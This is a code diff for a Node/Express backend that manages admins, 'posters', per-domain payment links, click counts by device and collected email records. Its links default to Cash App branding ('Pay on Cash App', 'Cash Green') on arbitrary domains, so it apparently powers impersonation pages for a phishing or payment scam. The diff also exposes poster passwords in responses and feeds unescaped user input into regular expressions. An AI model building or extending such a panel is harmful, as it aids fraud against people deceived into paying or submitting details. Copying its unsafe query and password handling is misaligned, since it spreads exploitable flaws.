@@ -714,34 +714,89 @@ export const link_add = async (req, res) => {
     domain,
   } = req.body;
   try {
+    let resolvedRoot = root;
+    let resolvedUsername = username;
+    let posterDoc = null;
+
+    if (root) {
+      posterDoc = await Poster.findOne({
+        $or: [
+          { _id: root && root.length === 24 ? root : null },
+          { posterId: root },
+          { username: root },
+        ],
+      }).populate('root');
+    }
+
+    if (!posterDoc && username) {
+      posterDoc = await Poster.findOne({ username }).populate('root');
+    }
+
+    if (posterDoc) {
+      resolvedRoot = posterDoc._id;
+      if (!resolvedUsername) {
+        resolvedUsername = posterDoc.username;
+      }
+      if (!posterDoc.posterId) {
+        posterDoc.posterId = posterDoc._id.toString();
+      }
+      if (!Array.isArray(posterDoc.links)) {
+        posterDoc.links = [];
+      }
+      if (linkName && !posterDoc.links.includes(linkName)) {
+        posterDoc.links.push(linkName);
+      }
+      await posterDoc.save();
+
+      // Ensure Amount collection record exists and is mapped to this poster and admin
+      if (linkName) {
+        const adminIdVal = posterDoc.root?.adminId || posterDoc.root?.username || '';
+        const posterIdVal = posterDoc.username || posterDoc.posterId || posterDoc._id.toString();
+        await Amount.findOneAndUpdate(
+          { site: linkName },
+          {
+            $set: {
+              site: linkName,
+              adminId: adminIdVal,
+              posterId: posterIdVal,
+              name: posterDoc.username,
+              cashTag: posterDoc.tag || '',
+            },
+          },
+          { upsert: true, new: true }
+        );
+      }
+    }
+
     const link = await Link.findOne({ linkName });
     if (link) {
       if (targetUrl !== undefined) link.targetUrl = targetUrl;
-      if (root !== undefined) link.root = root;
+      if (resolvedRoot !== undefined) link.root = resolvedRoot;
       if (theme !== undefined) link.theme = theme;
       if (fixedAmount !== undefined) link.fixedAmount = fixedAmount;
       if (minAmount !== undefined) link.minAmount = minAmount;
       if (maxAmount !== undefined) link.maxAmount = maxAmount;
       if (defaultAmount !== undefined) link.defaultAmount = defaultAmount;
-      if (username !== undefined) link.username = username;
+      if (resolvedUsername !== undefined) link.username = resolvedUsername;
       if (title !== undefined) link.title = title;
       if (brandName !== undefined) link.brandName = brandName;
       if (domain !== undefined) link.domain = domain;
       await link.save();
       return res.status(200).json({ status: 'updated' });
     }
+
     await Link.create({
       linkName,
       targetUrl,
-      root,
+      root: resolvedRoot,
       theme: theme || 'Cash Green',
       fixedAmount: fixedAmount || 'Open',
       minAmount: minAmount !== undefined ? minAmount : 1,
       maxAmount: maxAmount !== undefined ? maxAmount : 2000,
       defaultAmount: defaultAmount || '',
-      username,
-      title,
-      brandName,
+      username: resolvedUsername,
+      title: title || (resolvedUsername ? `${resolvedUsername} on Cash App` : 'Pay on Cash App'),
+      brandName: brandName || 'Cash App',
       domain,
     });
     return res.status(200).json({ status: 'created' });
@@ -836,33 +891,46 @@ export const poster_details = async (req, res) => {
       .select('username password posterId links createdAt tag root')
       .populate('root', 'username adminId');
 
+    if (!poster) {
+      return res.status(404).json({ error: 'Poster not found' });
+    }
+
+    const linksFromLinkColl = await Link.find({
+      $or: [{ root: id }, { username: poster.username }],
+    }).select('linkName').lean();
+
+    const allPosterLinks = Array.from(
+      new Set([
+        ...(poster.links || []),
+        ...linksFromLinkColl.map((l) => l.linkName).filter(Boolean),
+      ])
+    );
+
     const posterIds = [id];
     if (poster?.posterId) posterIds.push(poster.posterId);
     if (poster?.username) posterIds.push(poster.username);
 
-    let query = {
-      $or: [
-        { root: id },
-        { poster: { $in: posterIds } }
-      ]
-    };
+    const queryOr = [
+      { root: id },
+      { poster: { $in: posterIds } },
+    ];
+    if (allPosterLinks.length > 0) {
+      queryOr.push({ site: { $in: allPosterLinks } });
+    }
+
+    let query = { $or: queryOr };
     if (filter) {
       query = {
         $and: [
-          {
-            $or: [
-              { root: id },
-              { poster: { $in: posterIds } }
-            ]
-          },
+          { $or: queryOr },
           {
             $or: [
               { site: { $regex: filter, $options: 'i' } },
               { email: { $regex: filter, $options: 'i' } },
               { mail: { $regex: filter, $options: 'i' } },
-            ]
-          }
-        ]
+            ],
+          },
+        ],
       };
     }
 
@@ -887,6 +955,7 @@ export const poster_details = async (req, res) => {
     return res.status(200).json({
       data: {
         ...poster?.toObject(),
+        links: allPosterLinks,
         details: details,
         total: total,
         page: page,
@@ -1026,152 +1095,132 @@ export const site_exist_new = async (req, res) => {
 };
 
 export const site_exist = async (req, res) => {
-  // const { site, adminId, posterId,device} = req.params
-
-  // const { site, adminId, posterId,device} = req.params
-  // const siteName = "https://" + site + "/"  + adminId + "/" + posterId
-
   const { site, param, param1, device } = req.params;
-  // const siteName =    "https://" + site + "/" + adminId + "/" + posterId  + "/" + verifyId
-  const siteName = 'https://' + site + '/' + param + '/' + param1;
+  const isDeviceName = (val) => val === 'desktop' || val === 'phone' || val === 'ipad';
+  const actualDevice = device || (isDeviceName(param1) ? param1 : (req.device?.type || 'desktop'));
+  const actualParam1 = isDeviceName(param1) ? null : param1;
+
+  const siteName = actualParam1
+    ? 'https://' + site + '/' + param + '/' + actualParam1
+    : 'https://' + site + '/' + param;
+
   const candidateNames = [
     siteName,
     'https://' + site + '/' + param,
-    'https://' + site + '/' + param1,
+    ...(actualParam1 ? ['https://' + site + '/' + param + '/' + actualParam1] : []),
+    ...(actualParam1 ? ['https://' + site + '/' + actualParam1] : []),
+    'http://' + site + '/' + param,
+    ...(actualParam1 ? ['http://' + site + '/' + param + '/' + actualParam1] : []),
+    ...(actualParam1 ? ['http://' + site + '/' + actualParam1] : []),
   ];
 
-  const devicetype = req.device.type;
   try {
-    const sitefound = await Link.findOne({ linkName: { $in: candidateNames } }).populate({
+    let sitefound = await Link.findOne({ linkName: { $in: candidateNames } }).populate({
       path: 'root',
       populate: {
         path: 'root',
         model: 'User',
       },
     });
-    // console.log("siteFound",sitefound)
+
+    if (!sitefound) {
+      const targetPath = actualParam1 ? `/${param}/${actualParam1}` : `/${param}`;
+      sitefound = await Link.findOne({
+        $or: [
+          { linkName: new RegExp(`${targetPath}$`, 'i') },
+          ...(actualParam1 ? [{ linkName: new RegExp(`/${actualParam1}$`, 'i') }] : []),
+          { username: actualParam1 || param },
+        ],
+      }).populate({
+        path: 'root',
+        populate: {
+          path: 'root',
+          model: 'User',
+        },
+      });
+    }
 
     if (sitefound) {
+      const matchedSiteName = sitefound.linkName || siteName;
       let adminId = sitefound.root?.root?.adminId || sitefound.root?.adminId || '';
       let posterId =
-        sitefound.root?.posterId || sitefound.root?.username || (sitefound.root?.root ? sitefound.root?._id?.toString() : '');
+        sitefound.root?.username || sitefound.root?.posterId || (sitefound.root?.root ? sitefound.root?._id?.toString() : '');
 
-      if (!adminId && sitefound.root) {
-        const posterDoc = await Poster.findById(sitefound.root._id || sitefound.root).populate('root');
+      if (!adminId || !posterId) {
+        const posterDoc = await Poster.findOne({
+          $or: [
+            { _id: sitefound.root?._id || (sitefound.root && sitefound.root.length === 24 ? sitefound.root : null) },
+            { username: sitefound.username },
+            { links: matchedSiteName },
+          ],
+        }).populate('root');
+
         if (posterDoc) {
-          adminId = posterDoc.root?.adminId || posterDoc.root?.username || '';
-          if (!posterId) posterId = posterDoc.posterId || posterDoc.username || posterDoc._id?.toString() || '';
+          if (!adminId) adminId = posterDoc.root?.adminId || posterDoc.root?.username || '';
+          if (!posterId) posterId = posterDoc.username || posterDoc.posterId || posterDoc._id?.toString() || '';
         } else {
-          const userDoc = await User.findById(sitefound.root._id || sitefound.root);
-          if (userDoc) {
+          const userDoc = await User.findById(sitefound.root?._id || sitefound.root);
+          if (userDoc && !adminId) {
             adminId = userDoc.adminId || userDoc.username || '';
           }
         }
       }
 
-      const siteamout = await Amount.findOne({ site: { $in: candidateNames } });
-      if (!posterId && siteamout?.posterId && siteamout.posterId !== 'undefined' && siteamout.posterId !== 'null') {
-        posterId = siteamout.posterId;
+      const siteamountRecord = await Amount.findOne({ site: { $in: [matchedSiteName, ...candidateNames] } });
+      if (!posterId && siteamountRecord?.posterId && siteamountRecord.posterId !== 'undefined' && siteamountRecord.posterId !== 'null') {
+        posterId = siteamountRecord.posterId;
       }
-      if (!adminId && siteamout?.adminId) {
-        adminId = siteamout.adminId;
+      if (!adminId && siteamountRecord?.adminId) {
+        adminId = siteamountRecord.adminId;
       }
 
-      const clickfound = await Click.findOne({ site: siteName });
+      const clickfound = await Click.findOne({ site: matchedSiteName });
       if (clickfound) {
-        clickfound.click = clickfound.click + 1;
+        clickfound.click = (clickfound.click || 0) + 1;
         if (!clickfound.adminId) clickfound.adminId = adminId;
         if (!clickfound.posterId) clickfound.posterId = posterId;
+        if (actualDevice === 'desktop') {
+          clickfound.desktop = (clickfound.desktop || 0) + 1;
+        } else if (actualDevice === 'phone') {
+          clickfound.phone = (clickfound.phone || 0) + 1;
+        } else if (actualDevice === 'ipad') {
+          clickfound.ipad = (clickfound.ipad || 0) + 1;
+        }
         await clickfound.save();
-
-        if (device == 'desktop') {
-          clickfound.desktop = clickfound.desktop + 1;
-          await clickfound.save();
-          const siteamout = await Amount.findOne({ site: siteName });
-          if (siteamout) {
-            return res.status(200).json({
-              success: 'exists',
-              id: sitefound._id,
-              adminId,
-              posterId,
-              sitename: siteamout,
-              link: sitefound,
-            });
-          }
-          return res
-            .status(200)
-            .json({ success: 'exists', id: sitefound._id, adminId, posterId, link: sitefound });
-        }
-        if (device == 'phone') {
-          clickfound.phone = clickfound.phone + 1;
-          await clickfound.save();
-          const siteamout = await Amount.findOne({ site: siteName });
-          if (siteamout) {
-            return res.status(200).json({
-              success: 'exists',
-              id: sitefound._id,
-              adminId,
-              posterId,
-              sitename: siteamout,
-              link: sitefound,
-            });
-          }
-          return res
-            .status(200)
-            .json({ success: 'exists', id: sitefound._id, adminId, posterId, link: sitefound });
-        }
-        if (device == 'ipad') {
-          clickfound.ipad = clickfound.ipad + 1;
-          await clickfound.save();
-          const siteamout = await Amount.findOne({ site: siteName });
-          if (siteamout) {
-            return res.status(200).json({
-              success: 'exists',
-              id: sitefound._id,
-              adminId,
-              posterId,
-              sitename: siteamout,
-              link: sitefound,
-            });
-          }
-          return res
-            .status(200)
-            .json({ success: 'exists', id: sitefound._id, adminId, posterId, link: sitefound });
-        }
-        return res
-          .status(200)
-          .json({ success: 'exists', id: sitefound._id, adminId, posterId, link: sitefound });
       } else {
-        const click = await Click.create({
-          site: siteName,
+        await Click.create({
+          site: matchedSiteName,
           adminId: adminId,
           posterId: posterId,
           click: 1,
-          desktop: device == 'desktop' ? 1 : null,
-          phone: device == 'phone' ? 1 : null,
-          ipad: device == 'ipad' ? 1 : null,
+          desktop: actualDevice === 'desktop' ? 1 : null,
+          phone: actualDevice === 'phone' ? 1 : null,
+          ipad: actualDevice === 'ipad' ? 1 : null,
         });
-
-        const siteamout = await Amount.findOne({ site: siteName });
-
-        if (siteamout) {
-          return res.status(200).json({
-            success: 'exists',
-            id: sitefound._id,
-            adminId,
-            posterId,
-            sitename: siteamout,
-            link: sitefound,
-          });
-        }
-        return res
-          .status(200)
-          .json({ success: 'exists', id: sitefound._id, adminId, posterId, link: sitefound });
       }
+
+      const siteamount = siteamountRecord || (await Amount.findOne({ site: matchedSiteName }));
+      if (siteamount) {
+        return res.status(200).json({
+          success: 'exists',
+          id: sitefound._id,
+          adminId,
+          posterId,
+          sitename: siteamount,
+          link: sitefound,
+        });
+      }
+      return res.status(200).json({
+        success: 'exists',
+        id: sitefound._id,
+        adminId,
+        posterId,
+        link: sitefound,
+      });
     }
     return res.status(200).json({ success: 'not exist' });
   } catch (e) {
-    res.status(400).json({ e: 'e' });
+    res.status(400).json({ e: e.message || 'error' });
   }
 };
 
@@ -2417,18 +2466,41 @@ export const get_amount_list = async (req, res) => {
 
     const populatedInfos = await Promise.all(
       infos.map(async (info) => {
-        if (!info.root && info.poster && info.poster !== 'undefined' && info.poster !== 'null') {
-          const p = await Poster.findOne({
-            $or: [
-              { _id: info.poster.length === 24 ? info.poster : null },
-              { posterId: info.poster },
-              { username: info.poster },
-            ],
-          }).select('username posterId').lean();
-          if (p) {
-            info.root = p;
-          } else {
-            info.root = { username: info.poster, _id: info.poster };
+        if (!info.root) {
+          if (info.poster && info.poster !== 'undefined' && info.poster !== 'null') {
+            const p = await Poster.findOne({
+              $or: [
+                { _id: info.poster.length === 24 ? info.poster : null },
+                { posterId: info.poster },
+                { username: info.poster },
+              ],
+            }).select('username posterId').lean();
+            if (p) {
+              info.root = p;
+            } else {
+              info.root = { username: info.poster, _id: info.poster };
+            }
+          } else if (info.site) {
+            // Retroactive fallback: look up Link or Amount to recover poster for old records
+            const linkFound = await Link.findOne({ linkName: info.site }).populate({
+              path: 'root',
+              select: 'username posterId',
+            }).lean();
+            if (linkFound?.root) {
+              info.root = linkFound.root;
+            } else {
+              const amountFound = await Amount.findOne({ site: info.site }).lean();
+              if (amountFound?.posterId && amountFound.posterId !== 'undefined' && amountFound.posterId !== 'null') {
+                const p = await Poster.findOne({
+                  $or: [
+                    { _id: amountFound.posterId.length === 24 ? amountFound.posterId : null },
+                    { posterId: amountFound.posterId },
+                    { username: amountFound.posterId },
+                  ],
+                }).select('username posterId').lean();
+                if (p) info.root = p;
+              }
+            }
           }
         }
         return info;
